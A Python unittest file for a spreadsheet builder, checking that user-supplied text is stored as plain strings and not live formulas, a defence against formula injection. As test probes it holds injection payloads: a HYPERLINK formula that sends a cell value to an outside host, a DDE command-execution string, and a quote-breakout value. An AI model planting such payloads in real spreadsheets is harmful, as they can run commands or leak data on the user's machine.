"""Row 48a (decision C103, security review row 48 M1): content text is never a live formula.

scripts/datum_xlsx.py writes a cell as a formula only when the builder itself marks it (a
Formula value: its own composed formulas, 'SHEET:key' links and a hitung value the content
marks with a leading "="). Every other text is a string cell, kept as the author gave it
(C45), and --check flags text that looks like a formula and formulas outside the builder's
function set.

    DATUM_XLSX_TEST_ISI=<Kasus 02 isi.json> python3 -I -B -m unittest discover -s tests -v

The build tests need the content file (skipped without it); the --check and formula_like tests
need only openpyxl.
"""
import copy, importlib.util, json, os, re, subprocess, sys, tempfile, unittest, zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
SKILL = os.path.dirname(HERE)
BUILDER = os.path.join(SKILL, 'scripts', 'datum_xlsx.py')
ISI = os.environ.get('DATUM_XLSX_TEST_ISI')

_spec = importlib.util.spec_from_file_location('datum_xlsx_row48a', BUILDER)
dx = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(dx)

try:
    import openpyxl
except ImportError:          # pragma: no cover - the runtime ships openpyxl
    openpyxl = None

# The row 48 probe (verification/02_security.md M1) and three more shapes.
HYPER = '=HYPERLINK("https://example.invalid/?d="&A1,"buka")'
PLUS_DDE = "+cmd|' /C calc'!A0"
AT_SUM = '@SUM(1,1)'
ONE_PLUS_ONE = '=1+1'
HEAD_EQ = '=2+3'
GAGAL_BREAKOUT = 'GAGAL", HYPERLINK("https://example.invalid/","x'


def build(isi, out):
    os.makedirs(out, exist_ok=True)
    src = os.path.join(out, 'isi.json')
    with open(src, 'w', encoding='utf-8') as f:
        json.dump(isi, f, ensure_ascii=False)
    p = subprocess.run([sys.executable, '-I', '-B', BUILDER, src, '-o', out], capture_output=True, text=True)
    return p, os.path.join(out, isi['keluaran'])


def formulas(wb):
    return {(ws.title, c.coordinate): c.value for ws in wb.worksheets for row in ws.iter_rows()
            for c in row if c.data_type == 'f'}


def find_text(wb, sheet, text):
    return [c for row in wb[sheet].iter_rows() for c in row if c.value == text]


@unittest.skipUnless(ISI and openpyxl, 'set DATUM_XLSX_TEST_ISI to the Kasus 02 isi.json')
class BuildKeepsTextAsText(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix='row48a-')
        with open(ISI, encoding='utf-8') as f:
            clean = json.load(f)
        p, path = build(clean, os.path.join(cls.tmp, 'clean'))
        assert p.returncode == 0, p.stdout + p.stderr
        cls.clean = openpyxl.load_workbook(path)
        isi = copy.deepcopy(clean)
        items = [it for it in isi['rab']['butir'] if it[0] != '§']
        items[0][1] = HYPER                   # RAB work item text (the row 48 probe)
        items[1][1] = ONE_PLUS_ONE
        items[1][3] = PLUS_DDE                # RAB unit text
        isi['ahs']['harga_dasar']['butir'][0][1] = AT_SUM
        isi['kendali']['kepala'] = [HEAD_EQ, 'Cara', 'Selisih', 'Vonis', 'Dasar']
        isi['kendali']['bendera']['gagal'] = GAGAL_BREAKOUT
        cls.proc, cls.path = build(isi, os.path.join(cls.tmp, 'probe'))
        cls.wb = openpyxl.load_workbook(cls.path)
        cls.xml = {n: zipfile.ZipFile(cls.path).read(n).decode('utf-8')
                   for n in zipfile.ZipFile(cls.path).namelist() if n.startswith('xl/worksheets/sheet')}

    def test_workbook_is_written_and_flagged(self):
        self.assertTrue(os.path.isfile(self.path), self.proc.stdout + self.proc.stderr)
        self.assertEqual(self.proc.returncode, 1, self.proc.stdout + self.proc.stderr)
        self.assertIn('finding(s)', self.proc.stdout)
        for text in (HYPER, ONE_PLUS_ONE, PLUS_DDE, AT_SUM, HEAD_EQ):
            self.assertIn(repr(text[:60]) + ' looks like a formula', self.proc.stdout, text)

    def test_probe_cells_are_strings_with_the_authors_text(self):
        for sheet, text in (('RAB', HYPER), ('RAB', ONE_PLUS_ONE), ('RAB', PLUS_DDE), ('AHS', AT_SUM),
                            ('KENDALI', HEAD_EQ)):
            cells = find_text(self.wb, sheet, text)
            self.assertTrue(cells, f'{sheet}: {text} not found as written')
            for c in cells:
                self.assertEqual(c.data_type, 's', f'{sheet}!{c.coordinate} {text}')

    def test_no_injected_formula_in_the_package(self):
        for name, x in self.xml.items():
            for f in re.findall(r'<f>(.*?)</f>', x):
                code = re.sub(r'&quot;(?:(?!&quot;).)*&quot;|"(?:[^"]|"")*"', '""', f)
                self.assertNotIn('HYPERLINK', code.upper(), f'{name}: {f}')
                self.assertNotIn('|', code, f'{name}: {f}')
                self.assertNotEqual(f, '1+1', name)

    def test_flag_text_cannot_leave_its_string_literal(self):
        flag = [v for (s, _), v in formulas(self.wb).items() if s == 'KENDALI' and v.startswith('=IF(COUNTIF(')]
        self.assertEqual(len(flag), 1, flag)
        self.assertTrue(flag[0].endswith(',"' + GAGAL_BREAKOUT.replace('"', '""') + '")'), flag[0])
        code = re.sub(r'"(?:[^"]|"")*"', '""', flag[0])
        self.assertEqual(sorted(set(re.findall(r'([A-Z]+)\(', code))), ['COUNTIF', 'IF'])

    def test_real_formulas_are_unchanged(self):
        # Every formula of the clean Kasus 02 build is still a formula, and only those exist
        # (the probes change text cells only). 68 = row 100c's count on Kasus 02 Rev A.
        clean, probe = formulas(self.clean), formulas(self.wb)
        self.assertEqual(len(clean), 68)
        self.assertEqual(set(clean), set(probe))
        flag_key = [k for k, v in clean.items() if k[0] == 'KENDALI' and v.startswith('=IF(COUNTIF(')][0]
        for k, v in clean.items():
            if k != flag_key:
                self.assertEqual(probe[k], v, k)

    def test_content_marked_and_divisor_formulas_stay_formulas(self):
        f = formulas(self.clean)
        # hitung value "=luas/titik" (content-marked, HITUNG-RUANG kepadatan) is a formula
        self.assertTrue(any(s == 'HITUNG-RUANG' and re.fullmatch(r'=C\d+/C\d+', v) for (s, _), v in f.items()))
        # WB-16 / C50: percent formulas divide by the PEMBAGI-PERSEN cell, written as formulas
        ws = self.clean['HITUNG-PAJAK']
        row = [c.row for c in ws['A'] if c.value == 'PEMBAGI-PERSEN'][0]
        ref = re.compile(rf"(HITUNG-PAJAK|'HITUNG-PAJAK')!C{row}\b|^=.*/C{row}\b")
        users = [v for v in f.values() if ref.search(v)]
        self.assertGreaterEqual(len(users), 4, users)


@unittest.skipUnless(openpyxl, 'openpyxl missing')
class CheckRule(unittest.TestCase):
    def test_check_flags_foreign_functions_dde_and_formula_like_text(self):
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = 'RAB'
        ws['A1'] = '=HYPERLINK("https://example.invalid/","x")'
        ws['A2'] = '=SUM(A5:A6)'
        ws['A3'] = "=cmd|' /C calc'!A0"
        ws['A4'] = '=IF(A2>0,"HYPERLINK(x) | text","")'     # call and bar inside a literal only
        for ref, text in (('B1', '=1+1'), ('B2', '-cmd'), ('B3', '@SUM(1)'), ('B4', '-'), ('B5', '- butir'),
                          ('B6', '-5'), ('B7', '+2,5 %'), ('B8', 'Rp 1.000'), ('B9', '\t=1')):
            ws[ref] = text
            ws[ref].data_type = 's'
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, 'probe.xlsx')
            wb.save(path)
            found = [x for x in dx.check_file(path) if 'C103' in x]
        cells = sorted(x.split(':')[0] for x in found)
        self.assertEqual(cells, ['RAB!A1', 'RAB!A3', 'RAB!B1', 'RAB!B2', 'RAB!B3', 'RAB!B9'], found)
        self.assertIn('HYPERLINK', [x for x in found if x.startswith('RAB!A1')][0])
        self.assertIn('DDE', [x for x in found if x.startswith('RAB!A3')][0])

    def test_formula_like(self):
        for t in ('=1+1', '=HYPERLINK("x")', '+cmd', '-cmd', '@SUM(1)', '\t=1', '\r=1', '  =1', '+A1', '-2+3+cmd'):
            self.assertTrue(dx.formula_like(t), repr(t))
        for t in ('', '-', '--', '- butir', '+ catatan', '-5', '+2,5 %', '-1.000,50', 'Rp 1', 'a=b', '[ASUMSI]'):
            self.assertFalse(dx.formula_like(t), repr(t))


@unittest.skipUnless(openpyxl, 'openpyxl missing')
class PutTypesText(unittest.TestCase):
    def test_put_types_plain_text_as_string_and_formula_as_formula(self):
        book = dx.Book.__new__(dx.Book)          # put() needs only font()
        wb = openpyxl.Workbook()
        ws = wb.active
        self.assertEqual(book.put(ws, 'A1', '=1+1').data_type, 's')
        self.assertEqual(book.put(ws, 'A2', dx.Formula('=1+1')).data_type, 'f')
        self.assertEqual(book.put(ws, 'A3', 12).data_type, 'n')
        self.assertEqual(ws['A1'].value, '=1+1')


if __name__ == '__main__':
    unittest.main()
